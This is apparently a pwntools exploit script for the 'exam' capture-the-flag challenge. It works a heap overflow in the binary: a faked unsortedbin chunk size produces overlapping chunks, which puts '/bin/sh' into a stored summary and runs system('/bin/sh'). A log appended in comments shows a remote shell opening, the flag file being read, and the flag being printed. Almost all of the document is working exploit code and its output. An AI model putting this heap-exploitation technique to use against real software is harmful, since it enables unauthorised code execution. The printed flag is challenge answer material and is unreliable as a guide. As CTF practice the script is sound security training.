#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context(arch='amd64', os='linux', aslr=False, terminal=['tmux', 'neww'])

if args['GDB']:
    io = gdb.debug('./exam', gdbscript='''\
        c
    ''')
    elf, libc = io.elf, io.libc
elif args['REMOTE']:
    io = remote('flatearth.fluxfingers.net', 1745)
    elf, libc = ELF('./exam'), None
else:
    io = process('./exam')
    elf, libc = io.elf, io.libc


def add_summary(data):
    io.sendline('1')
    io.send(data)


def remove_summary(num):
    io.sendline('2')
    io.sendline(str(num))


def create_crib():
    io.sendline('4')


# allocate smallchunks A, B, C, D, E
add_summary('IIIITTTTSSSSMMMMAAAAGGGG' + '\n')
add_summary('B' * 0x18 + '\n')
add_summary('C' * 0x18 + '\n')
add_summary('D' * 0x18 + '\n')
add_summary('bbbbiiiinnnn////sssshhhh' + '\n')

# deallocate B and C, coalescing them into a single free chunk {B+C}
# the address of {B+C} (which coincide with the address of B) is put in the unsortedbin
remove_summary(1)
remove_summary(2)

# allocate a new smallchunk
# the chunk {B+C} whose address is found in the unsortedbin is split in two, B1 and C1
# B1 (which coincide with old B) is returned and the address of C1 is the new unsortedbin top
# overflow the data of B1 overwriting C1 size metadata to make it bigger
add_summary('IIIICCCC////////////////' + '\x00' + 'c' * (0x80 - 0x19) + '\xf1')

# allocate a new smallchunk
# the chunk C1 in the unsortedbin (of faked size 0xf1) is split in two, C11 and D11
# C11 (which coincide with old C) is returned and the address of D11 is the new unsortedbin top
# D11 overlaps with D (which is not free and contains a summary!)
add_summary('////////////////////////' + '\n')

# the next malloc() for storing the crib is going to use the fake free chunk D11, overwriting
# the content of D with 'ITSMAGIC/bin/sh\x00'
create_crib()

# go to the exam with the summary stored in chunk D (at index 3) to execute system('/bin/sh')
io.sendline('6')
io.sendline('3')

io.interactive()

# $ ./exam.py REMOTE
# [+] Opening connection to flatearth.fluxfingers.net on port 1745: Done
# [*] '/home/ubuntu/vbox/exam'
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [*] Switching to interactive mode
# Go to work! :-)
# . . .
# > Let's get to business! Crunching your data...
# Optimizing machine learning algorithms...
# Performing relevance analysis...
# Merged sources successfully. Result:
# ITSMAGIC////////////bin/sh
# ========
# 1. add summary
# 2. remove summary
# 3. study summary
# 4. create crib
# 5. tear crib in frustration
# 6. go to exam
# > You're allowed to bring one summary. Which one is it?
# > Cheeky little fella. Screw math, you deserve a straight A!
# $ ls
# exam
# flag
# setup.sh
# $ cat flag
# FLAG{wh0_n33d5_m4th_when_ch34t1ng_1s_4n_0pt10n}
